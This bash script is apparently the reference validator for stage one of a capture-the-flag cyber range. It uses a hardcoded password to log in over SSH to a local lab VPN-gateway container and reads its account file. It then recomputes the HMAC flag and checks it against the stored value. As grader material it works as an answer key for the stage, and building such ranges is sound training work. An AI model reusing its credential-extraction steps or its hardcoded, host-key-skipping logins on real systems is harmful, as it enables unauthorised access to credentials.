#!/usr/bin/env bash
###############################################################################
# Reference validation script — author/grader use only.
# Requires knowledge of this instance's seed context; has no function against
# production infrastructure.
#
# Connects to the vpn-gateway (SSH), reads field_accounts.conf, independently
# recomputes derive_flag(seed, 1, artifact) using the same seed, and prints
# the flag for automated diffing against the stored value.
#
# Usage:
#   ./red_attack_script.sh [--validation-mode]
#
# In validation mode (default), connects via SSH directly.
# Requires: sshpass, openssl, bash
###############################################################################
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SHARED_DIR="$(cd "${SCRIPT_DIR}/../shared" && pwd)"
RANGE_ENV="${SHARED_DIR}/range.env"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
info()  { echo -e "${GREEN}[+]${NC} $*"; }
warn()  { echo -e "${YELLOW}[!]${NC} $*"; }
err()   { echo -e "${RED}[-]${NC} $*" >&2; }
die()   { err "$@"; exit 1; }

# Load range config
[[ -f "$RANGE_ENV" ]] || die "range.env not found at ${RANGE_ENV}"
# shellcheck disable=SC1090
source "$RANGE_ENV"

# Validate required vars
[[ -n "${INSTANCE_SEED:-}" ]] || die "INSTANCE_SEED not set in range.env"
[[ -n "${PUBLIC_ZONE_GATEWAY_IP:-}" ]] || die "PUBLIC_ZONE_GATEWAY_IP not set"

SSH_PORT=2222
SSH_USER="field_tech"
SSH_PASS="FieldTech2024!"
TARGET_HOST="127.0.0.1"  # localhost since port is published

info "=== Stage 1 Validation — VPN Gateway Credential Extraction ==="
echo ""

# --- Step 1: Check connectivity -------------------------------------------
info "Step 1: Checking SSH connectivity..."
if ! timeout 5 bash -c "echo >/dev/tcp/${TARGET_HOST}/${SSH_PORT}" 2>/dev/null; then
    die "SSH port ${SSH_PORT} not reachable on ${TARGET_HOST}"
fi
info "SSH port reachable"

# --- Step 2: Connect and extract artifact ----------------------------------
info "Step 2: Extracting field_accounts.conf via SSH..."

# Check if sshpass is available
if ! command -v sshpass &>/dev/null; then
    warn "sshpass not installed — attempting podman exec fallback"
    ARTIFACT_LINE=$(podman exec vpn-gateway cat /etc/openvpn/server/field_accounts.conf 2>/dev/null) || \
        die "Could not extract artifact via SSH or podman exec"
else
    ARTIFACT_LINE=$(sshpass -p "$SSH_PASS" \
        ssh -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            -p "$SSH_PORT" \
            "${SSH_USER}@${TARGET_HOST}" \
            "cat /etc/openvpn/server/field_accounts.conf" 2>/dev/null) || \
        die "SSH connection or file read failed"
fi

if [[ -z "$ARTIFACT_LINE" ]]; then
    die "Artifact file is empty"
fi

info "Artifact extracted:"
echo "  ${ARTIFACT_LINE}"
echo ""

# --- Step 3: Independently compute the flag --------------------------------
info "Step 3: Computing flag from seed + artifact..."

FLAG_MSG="STAGE1:${ARTIFACT_LINE}"
FLAG_HEX=$(echo -n "$FLAG_MSG" | \
    openssl dgst -sha256 -mac HMAC -macopt "hexkey:${INSTANCE_SEED}" | \
    awk '{print $NF}' | head -c 16)
COMPUTED_FLAG="FLAG{S1-${FLAG_HEX}}"

info "Computed flag: ${COMPUTED_FLAG}"

# --- Step 4: Diff against stored flag --------------------------------------
info "Step 4: Verifying against stored flag..."

STORED_FLAG=$(podman exec vpn-gateway cat /run/ctf/stage1_flag 2>/dev/null) || \
    warn "Could not read stored flag from container"

if [[ -n "${STORED_FLAG:-}" ]]; then
    if [[ "$COMPUTED_FLAG" == "$STORED_FLAG" ]]; then
        echo ""
        info "✅ FLAG MATCH — Validation PASSED"
        echo -e "  Computed: ${GREEN}${COMPUTED_FLAG}${NC}"
        echo -e "  Stored:   ${GREEN}${STORED_FLAG}${NC}"
    else
        echo ""
        err "❌ FLAG MISMATCH — Validation FAILED"
        echo -e "  Computed: ${RED}${COMPUTED_FLAG}${NC}"
        echo -e "  Stored:   ${RED}${STORED_FLAG}${NC}"
        exit 1
    fi
else
    warn "Could not verify against stored flag — manual check required"
    echo -e "  Computed flag: ${YELLOW}${COMPUTED_FLAG}${NC}"
fi

echo ""
info "=== Validation complete ==="
